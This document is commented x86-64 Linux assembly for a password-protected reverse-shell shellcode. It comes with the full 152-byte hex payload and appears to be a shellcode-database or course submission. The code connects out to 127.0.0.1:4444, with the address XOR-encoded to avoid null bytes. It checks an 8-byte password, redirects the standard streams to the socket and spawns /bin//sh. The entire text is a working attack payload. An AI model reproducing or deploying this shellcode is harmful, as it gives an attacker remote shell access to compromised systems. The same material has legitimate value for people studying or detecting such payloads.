; Author: Robert C. Raducioiu
; Shellcode: "\x31\xf6\x48\xf7\xe6\x52\x5f\x48\x83\xc7\x02\x48\xff\xc6\x83\xc0\x29\x0f\x05\x48\x89\xc7\x31\xf6\x48\xf7\xe6\x50\x48\xbb\xfd\xff\xee\xa3\x80\xff\xff\xfe\x48\xc7\xc1\xff\xff\xff\xff\x48\x31\xcb\x53\x48\x89\xe6\x83\xc2\x10\x83\xc0\x2a\x0f\x05\x48\x83\xc2\x08\x48\x29\xd4\x48\x89\xe6\x31\xc0\x0f\x05\x5b\x48\xb8\x72\x62\x63\x74\x21\x32\x32\x0a\x48\x31\xd8\x74\x07\x31\xc0\x83\xc0\x3c\x0f\x05\x31\xc9\x48\xf7\xe1\x83\xc1\x02\x51\x52\x58\x83\xc0\x21\x48\x89\xce\x0f\x05\x59\x48\xff\xc9\x79\xef\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x83\xc0\x3b\x0f\x05"
; Shellcode length: 152 bytes

global _start

section .text

_start:

CreateSocket:

    ; clear registers for later usage
    xor esi, esi
    mul rsi

    ; 1st argument of socket(): communication domain
    ; in this case AF_INET, so it's based upon the IPv4 protocol
    push rdx
    pop rdi
    add rdi, 2
    
    ; 2nd argument of socket(): type of socket
    ; in this case: SOCK_STREAM, which means it uses the TCP protocol
    inc rsi

    ; 3rd argument: https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call

    ; Syscall socket()
    add eax, 41

    ; create socket and save the resulting file descriptor inside RAX
    syscall

Connect:

    ; 1st argument of connect(): file descriptor of the socket to connect
    mov rdi, rax

    xor esi, esi
    mul rsi

    ; padding for the sockaddr struct
    push rax

    ; address 127.0.0.1:4444
    mov rbx, 0xfeffff80a3eefffd
    mov rcx, 0xffffffffffffffff
    xor rbx, rcx

    ; push the pointer to the remote address on the stack
    push rbx
    mov rsi, rsp

    ; 3rd argument of connect(): size of the sockaddr struct
    add edx, 16

    ; syscall connect()
    add eax, 42

    ; invoke connect()
    syscall

CheckPassword:

    ; 3rd argument of read(): number of bytes to read
    add rdx, 8

    ; allocate 8 bytes on the stack for storing the password
    sub rsp, rdx

    ; 2nd argument of read(): pointer to buffer which will store the
    ; bytes received from the client
    mov rsi, rsp

    ; 1st argument of read() (client socket) shoud be unchanged (RDI)

    ; syscall read()
    xor eax, eax

    ; call read()
    syscall

    pop rbx
    mov rax, 0x0a32322174636272
    xor rax, rbx
    jz IO_Redirection

ExitWrongPassword:

    xor eax, eax
    add eax, 60
    syscall

IO_Redirection:

    xor ecx, ecx
    mul rcx
    add ecx, 2

DuplicateFileDescriptor:

    ; 1st argument of dup2(), file descriptor of the client socket, should be unchanged (RDI)
    ; 2nd argument of dup2(): file descriptor to redirect: stdin/stdout/stderr
    ; in this case the value is stored inside RCX -> 2,1,0
    push rcx
    
    ; syscall: dup2()
    push rdx
    pop rax
    add eax, 33

    ; 2nd argument of dup2(): file descriptor to redirect
    mov rsi, rcx

    ; call dup2()
    syscall

    pop rcx
    dec rcx
    jns DuplicateFileDescriptor

SpawnSystemShell:

    ; clear RAX register (zero-sign extended)
    xor eax, eax

    ; NULL terminator for the string below
    push rax

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    mov rdx, rsp

    ; string "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 1st argument of execve: executable to run
    mov rdi, rsp

    ; 2nd argument of execve: array of arguments passed to the executable
    push rax

    push rdi
    mov rsi, rsp

    ; syscall execve
    add eax, 0x3b

    ; invoke execve
    syscall
